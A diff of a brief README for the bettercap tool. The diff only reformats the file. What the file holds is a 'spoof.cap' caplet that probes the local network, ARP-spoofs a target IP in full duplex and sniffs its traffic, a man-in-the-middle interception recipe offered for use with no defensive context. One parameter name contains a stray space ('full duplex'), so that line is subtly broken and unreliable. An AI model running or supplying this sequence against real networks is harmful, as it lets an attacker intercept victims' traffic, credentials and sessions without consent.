@@ -3,19 +3,15 @@
 ![bettercap](https://raw.githubusercontent.com/bettercap/media/master/logo.png)
 
 
-## **To start with the program**
+## To start with the program
 
 bettercap iface **target IP**
 
 
-## **spoof.cap**
+## spoof.cap
 
 net.probe on
-
-set arp.spoof.full duplex true
-
-set arp.spoof.target <target IP>
-
-arp.spoof on
-
-net.sniff on
+</br>set arp.spoof.full duplex true
+</br>set arp.spoof.target <target IP>
+</br>arp.spoof on
+</br>net.sniff on
